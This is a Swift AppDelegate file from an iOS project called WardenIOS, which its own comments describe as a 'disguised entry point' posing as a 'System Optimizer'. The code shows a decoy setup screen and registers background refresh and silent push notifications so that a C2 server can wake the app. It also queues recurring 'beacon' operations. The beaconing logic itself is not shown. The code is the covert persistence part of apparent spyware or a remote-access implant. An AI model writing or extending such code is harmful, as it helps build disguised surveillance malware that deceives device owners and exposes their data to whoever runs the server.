//
//  AppDelegate.swift
//  WardenIOS — disguised entry point ("System Optimizer")
//

import UIKit
import BackgroundTasks
import UserNotifications

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?

    func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
    ) -> Bool {
        // disguised setup UI
        window = UIWindow(frame: UIScreen.main.bounds)
        window?.rootViewController = SetupViewController()
        window?.makeKeyAndVisible()

        // background refresh — wakes the beacon when iOS allows
        BGTaskScheduler.shared.register(
            forTaskWithIdentifier: "com.warden.ios.refresh",
            using: nil
        ) { task in
            self.handleBackgroundRefresh(task: task as! BGAppRefreshTask)
        }

        // notification permission doubles as a wake channel (silent pushes)
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { _, _ in }
        application.registerForRemoteNotifications()

        BeaconManager.shared.start()
        return true
    }

    // MARK: - background refresh

    private func handleBackgroundRefresh(task: BGAppRefreshTask) {
        let operation = BeaconOperation()
        task.expirationHandler = { operation.cancel() }
        operation.completionBlock = {
            task.setTaskCompleted(success: !operation.isCancelled)
        }
        BeaconQueue.shared.addOperation(operation)
    }

    func application(_ application: UIApplication,
                     performFetchWithCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        let op = BeaconOperation()
        op.completionBlock = { completionHandler(.newData) }
        BeaconQueue.shared.addOperation(op)
    }

    // silent push — wakes the agent on demand from the C2
    func application(_ application: UIApplication,
                     didReceiveRemoteNotification userInfo: [AnyHashable: Any],
                     fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        let op = BeaconOperation()
        op.completionBlock = { completionHandler(.newData) }
        BeaconQueue.shared.addOperation(op)
    }

    func application(_ application: UIApplication,
                     didFailToRegisterForRemoteNotificationsWithError error: Error) {
        // no push token (simulator / no entitlement) — beacon still runs on timers
    }

    // location launch (app started by iOS in background due to location event)
    // handled by significant-location monitoring started in didFinishLaunching
}

/// Serial queue so beacons never overlap.
class BeaconQueue: OperationQueue {
    static let shared: OperationQueue = {
        let q = OperationQueue()
        q.maxConcurrentOperationCount = 1
        return q
    }()
}

class BeaconOperation: Operation {
    private var executing = false {
        willSet { willChangeValue(forKey: "isExecuting") }
        didSet { didChangeValue(forKey: "isExecuting") }
    }
    private var finished = false {
        willSet { willChangeValue(forKey: "isFinished") }
        didSet { didChangeValue(forKey: "isFinished") }
    }
    override var isAsynchronous: Bool { true }
    override var isExecuting: Bool { executing }
    override var isFinished: Bool { finished }

    override func start() {
        if isCancelled { finish(); return }
        executing = true
        BeaconManager.shared.tick { [weak self] in
            self?.finish()
        }
    }
    private func finish() {
        executing = false
        finished = true
    }
}
